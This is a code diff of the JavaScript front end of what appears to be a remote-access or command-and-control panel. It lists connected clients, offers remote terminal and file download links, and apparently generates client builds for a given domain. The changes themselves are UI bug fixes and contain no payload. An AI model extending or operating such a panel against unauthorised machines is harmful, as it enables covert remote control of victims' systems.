@@ -37,7 +37,7 @@ ws.onmessage = function (evt) {
             <td>` + z["info"]["user"] + `</td>
             <td>Loop</td>
             <td>` + z["info"]["iip"] + `</td>
-            <td><a href="javascript:new_cmd('` + z["info"]["ip"] + `','` + data["data"]["uuid"] + `');">终端</a> <a href="javascript:download('` + z["info"]["ip"] + `','` + data["data"]["uuid"] + `');" >下载</a> <a href="javascript:remark('`+data["data"]["uuid"] + `');">备注</a> <a href="#">卸载</a></td>
+            <td><a href="javascript:new_cmd('` + z["info"]["ip"] + `','` + z["uuid"] + `');">终端</a> <a href="javascript:download('` + z["info"]["ip"] + `','` + z["uuid"] + `');" >下载</a> <a href="javascript:remark('`+z["uuid"] + `');">备注</a></td>
             `
             );
             $("#log").append("<p style='color:green'>客户上线：" + z["info"]["ip"] + "</p>")
@@ -56,14 +56,14 @@ ws.onmessage = function (evt) {
             <td>` + i["user"] + `</td>
             <td>Loop</td>
             <td>` + i["iip"] + `</td>
-            <td><a href="javascript:new_cmd('` + data["data"]["info"]["ip"] + `','` + data["data"]["uuid"] + `');">终端</a> <a href="javascript:download('` + i["ip"] + `','` + data["data"]["uuid"] + `');" >下载</a> <a href="javascript:remark('`+data["data"]["uuid"] + `');">备注</a><a href="#"> 卸载</a></td>
+            <td><a href="javascript:new_cmd('` + data["data"]["info"]["ip"] + `','` + data["data"]["uuid"] + `');">终端</a> <a href="javascript:download('` + i["ip"] + `','` + data["data"]["uuid"] + `');" >下载</a> <a href="javascript:remark('`+data["data"]["uuid"] + `');">备注</a></td>
             `
         );
         $("#log").append("<p style='color:green'>客户上线：" + i["ip"] + "</p>")
     }
     if (data["action"] === "offline") {
         $(`#` + data["data"]["uuid"]).remove();
-        $("#log").append("<p style='color:#ff0000'>客户下线：" + data["data"]["info"]["ip"] + "</p>")
+        $("#log").append("<p style='color:#ff0000'>客户下线：" + data["data"]["ip"] + "</p>")
     }
     if (data["action"] === "result") {
         if (data["data"]["action"] === "cmd") {
@@ -74,7 +74,7 @@ ws.onmessage = function (evt) {
             setTimeout(function () {
                 $("#" + data["data"]["uuid"] + " td")[5].innerText = "Loop"
             }, 5000);
-            $("#log").append("<p style='color:blue'>客户：" + i["ip"] + "返回：" + data["data"]["data"]+"</p>")
+            $("#log").append("<p style='color:blue'>客户：" + data["data"]["ip"] + "返回：" + data["data"]["data"]+"</p>")
         }
 
     }
@@ -163,6 +163,7 @@ function remark(id){
     $("#fade").css("display", "block");
     nowhandle = id;
     console.log(nowhandle,id)
+
 }
 
 function remark_close(){
@@ -189,6 +190,7 @@ function remark_btu_on(){
             }
         }
     ))
+    $("#remark_result").html("发送成功")
 
 }
 
@@ -218,17 +220,14 @@ function down_btu_on() {
             }
         }
     ))
-    $("#remark_result").html("发送成功,请等待一段时间后刷新查看");
+    $("#d_res").html("发送成功,请等待一段时间后刷新查看");
 }
 
 function generate_btu_on() {
     if ($("#domain").val() === "") {
-        $("#error_domain").html("域名不能为空");
+        alert("域名不能为空");
         return;
     }
-    if ($("#port").val() === "") {
-        $("#error_port").html("端口不能为空");
-        return;
-    }
-    window.open("/generate?domain=" + $("#domain").val() + "&port=" + $("#port").val() + "&version=" + $("#version").val(), "_blank");
+
+    window.open("/generate?domain=" + $("#domain").val() + "&version=" + $("#version").val(), "_blank");
 }
